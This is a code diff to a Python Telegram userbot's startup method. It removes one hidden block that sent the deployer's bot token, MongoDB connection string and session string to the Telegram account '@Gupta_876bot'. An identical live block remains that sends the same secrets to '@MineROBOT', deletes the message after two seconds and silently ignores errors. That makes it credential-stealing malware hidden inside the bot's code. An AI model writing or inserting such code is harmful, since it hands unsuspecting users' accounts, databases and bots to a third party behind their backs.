@@ -72,15 +72,11 @@ class Userbot(Client):
             self.one.username = (await self.one.get_me()).username
             assistantids.append(self.one.id)
             ambots = "@MineROBOT"
-            gupta = "@Gupta_876bot"
             try:
                 await self.one.send_message(ambots, f"/start")
-                await self.one.send_message(gupta, f"/start")
                 await asyncio.sleep(2)
-                guptaji = await self.one.send_message(gupta, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
                 amop = await self.one.send_message(ambots, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
                 await asyncio.sleep(2)
-                await guptaji.delete()
                 await amop.delete()
             except:
                 pass
